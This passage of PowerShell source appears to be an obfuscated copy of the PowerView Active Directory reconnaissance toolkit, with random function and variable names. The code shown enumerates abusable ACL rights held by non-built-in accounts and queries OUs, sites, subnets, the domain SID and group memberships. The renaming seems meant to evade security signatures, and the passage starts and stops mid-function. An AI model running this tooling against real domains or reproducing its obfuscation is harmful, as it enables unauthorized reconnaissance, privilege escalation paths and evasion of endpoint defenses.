        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $YbwoLawJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $JlcSqbqE99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $JlcSqbqE99['ResolveGUIDs'] = $YKZjzOnv99 }
        if ($PSBoundParameters['RightsFilter']) { $JlcSqbqE99['RightsFilter'] = $YbwoLawJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $JlcSqbqE99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $JlcSqbqE99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $JlcSqbqE99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $JlcSqbqE99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $JlcSqbqE99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $JlcSqbqE99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $JlcSqbqE99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $JlcSqbqE99['Credential'] = $QWHERWHL99 }
        $BglsdSWx99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $BglsdSWx99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $BglsdSWx99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $BglsdSWx99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BglsdSWx99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $BglsdSWx99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $BglsdSWx99['Credential'] = $QWHERWHL99 }
        $YGZtXoSJ99 = @{}
        if ($PSBoundParameters['Server']) { $YGZtXoSJ99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Credential']) { $YGZtXoSJ99['Credential'] = $QWHERWHL99 }
        $ZqEujoWN99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $JlcSqbqE99['Domain'] = $CmuysoGL99
            $YGZtXoSJ99['Domain'] = $CmuysoGL99
        }
        Naples @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ZqEujoWN99[$_.SecurityIdentifier.Value]) {
                        $MsnqncXd99, $fQwSSPfB99, $MqjPAJDE99, $LUCPcHEZ99 = $ZqEujoWN99[$_.SecurityIdentifier.Value]
                        $GoDlaYmz99 = New-Object PSObject
                        $GoDlaYmz99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $GoDlaYmz99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $GoDlaYmz99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $GoDlaYmz99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $GoDlaYmz99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $GoDlaYmz99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $GoDlaYmz99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $GoDlaYmz99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $GoDlaYmz99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceName' $MsnqncXd99
                        $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceDomain' $fQwSSPfB99
                        $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceDN' $MqjPAJDE99
                        $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceClass' $LUCPcHEZ99
                        $GoDlaYmz99
                    }
                    else {
                        $MqjPAJDE99 = upbraids -NADQIykH99 $_.SecurityIdentifier.Value -ZMAhChio99 DN @ADNameArguments
                        if ($MqjPAJDE99) {
                            $fQwSSPfB99 = $MqjPAJDE99.SubString($MqjPAJDE99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $BglsdSWx99['Domain'] = $fQwSSPfB99
                            $BglsdSWx99['Identity'] = $MqjPAJDE99
                            $Object = monologue @ObjectSearcherArguments
                            if ($Object) {
                                $MsnqncXd99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $LUCPcHEZ99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $LUCPcHEZ99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $LUCPcHEZ99 = 'user'
                                }
                                else {
                                    $LUCPcHEZ99 = $Null
                                }
                                $ZqEujoWN99[$_.SecurityIdentifier.Value] = $MsnqncXd99, $fQwSSPfB99, $MqjPAJDE99, $LUCPcHEZ99
                                $GoDlaYmz99 = New-Object PSObject
                                $GoDlaYmz99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $GoDlaYmz99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $GoDlaYmz99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $GoDlaYmz99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $GoDlaYmz99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $GoDlaYmz99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $GoDlaYmz99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $GoDlaYmz99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $GoDlaYmz99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceName' $MsnqncXd99
                                $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceDomain' $fQwSSPfB99
                                $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceDN' $MqjPAJDE99
                                $GoDlaYmz99 | Add-Member NoteProperty 'IdentityReferenceClass' $LUCPcHEZ99
                                $GoDlaYmz99
                            }
                        }
                        else {
                            Write-Warning "[hyphen] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with upbraids"
                        }
                    }
                }
            }
        }
    }
}
function headboards {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $NJskkmCv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $roIFVclL99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($roIFVclL99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^OU=.*') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[headboards] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $roIFVclL99 = squintest @SearcherArguments
                        if (-not $roIFVclL99) {
                            Write-Warning "[headboards] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                else {
                    try {
                        $PTUZmxXK99 = (-Join (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                    }
                    catch {
                        $UpOHlfOj99 += "(name=$xzUuDuRm99)"
                    }
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[headboards] Searching for OUs with $NJskkmCv99 set in the gpLink property"
                $iNUvqNTo99 += "(gplink=*$NJskkmCv99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[headboards] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            $roIFVclL99.filter = "(&(objectCategory=organizationalUnit)$iNUvqNTo99)"
            Write-Verbose "[headboards] headboards filter string: $($roIFVclL99.filter)"
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $roIFVclL99.FindOne() }
            else { $IUnNdChl99 = $roIFVclL99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = gelling -IzcJvFdA99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[headboards] Error disposing of the Results object: $_"
                }
            }
            $roIFVclL99.dispose()
        }
    }
}
function Javas {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $NJskkmCv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $MYMgbppU99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($MYMgbppU99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^CN=.*') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Javas] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $MYMgbppU99 = squintest @SearcherArguments
                        if (-not $MYMgbppU99) {
                            Write-Warning "[Javas] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                else {
                    try {
                        $PTUZmxXK99 = (-Join (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                    }
                    catch {
                        $UpOHlfOj99 += "(name=$xzUuDuRm99)"
                    }
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Javas] Searching for sites with $NJskkmCv99 set in the gpLink property"
                $iNUvqNTo99 += "(gplink=*$NJskkmCv99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Javas] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            $MYMgbppU99.filter = "(&(objectCategory=site)$iNUvqNTo99)"
            Write-Verbose "[Javas] Javas filter string: $($MYMgbppU99.filter)"
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $MYMgbppU99.FindAll() }
            else { $IUnNdChl99 = $MYMgbppU99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = gelling -IzcJvFdA99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[Javas] Error disposing of the Results object"
                }
            }
            $MYMgbppU99.dispose()
        }
    }
}
function shtik {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cgKWGcFU99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $jgFIESkr99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($jgFIESkr99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^CN=.*') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[shtik] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $jgFIESkr99 = squintest @SearcherArguments
                        if (-not $jgFIESkr99) {
                            Write-Warning "[shtik] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                else {
                    try {
                        $PTUZmxXK99 = (-Join (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                    }
                    catch {
                        $UpOHlfOj99 += "(name=$xzUuDuRm99)"
                    }
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[shtik] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            $jgFIESkr99.filter = "(&(objectCategory=subnet)$iNUvqNTo99)"
            Write-Verbose "[shtik] shtik filter string: $($jgFIESkr99.filter)"
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $jgFIESkr99.FindOne() }
            else { $IUnNdChl99 = $jgFIESkr99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $SxmADxBD99 = $_
                }
                else {
                    $SxmADxBD99 = gelling -IzcJvFdA99 $_.Properties
                }
                $SxmADxBD99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($SxmADxBD99.properties -and ($SxmADxBD99.properties.siteobject -like "*$cgKWGcFU99*")) {
                        $SxmADxBD99
                    }
                    elseif ($SxmADxBD99.siteobject -like "*$cgKWGcFU99*") {
                        $SxmADxBD99
                    }
                }
                else {
                    $SxmADxBD99
                }
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[shtik] Error disposing of the Results object: $_"
                }
            }
            $jgFIESkr99.dispose()
        }
    }
}
function gelid {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    $qbMTjYnI99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
    if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
    if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
    $DCSID = beefsteaks @SearcherArguments -kCjMYGtw99 | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[gelid] Error extracting domain SID for '$CmuysoGL99'"
    }
}
function highfalutin {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $bhQvJAVG99,
        [Switch]
        $eSSyreAo99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $atpTwoKX99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $HKmuNqLT99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $QwdpMGwv99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($QwdpMGwv99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($qbMTjYnI99['Properties']) {
                    $eNeuTler99 = $qbMTjYnI99['Properties']
                }
                $qbMTjYnI99['Identity'] = $bhQvJAVG99
                $qbMTjYnI99['Raw'] = $True
                monologue @SearcherArguments | ForEach-Object {
                    $xLLcaebG99 = $_.GetDirectoryEntry()
                    $xLLcaebG99.RefreshCache('tokenGroups')
                    $xLLcaebG99.TokenGroups | ForEach-Object {
                        $JqKuNPvR99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($JqKuNPvR99 -notmatch '^S-1-5-32-.*') {
                            $qbMTjYnI99['Identity'] = $JqKuNPvR99
                            $qbMTjYnI99['Raw'] = $False
                            if ($eNeuTler99) { $qbMTjYnI99['Properties'] = $eNeuTler99 }
                            $Group = monologue @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $UpOHlfOj99 = ''
                $iNUvqNTo99 = ''
                $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                    $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($xzUuDuRm99 -match '^S-1-') {
                        $UpOHlfOj99 += "(objectsid=$xzUuDuRm99)"
                    }
                    elseif ($xzUuDuRm99 -match '^CN=') {
                        $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[highfalutin] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                            $qbMTjYnI99['Domain'] = $oXGljrha99
                            $QwdpMGwv99 = squintest @SearcherArguments
                            if (-not $QwdpMGwv99) {
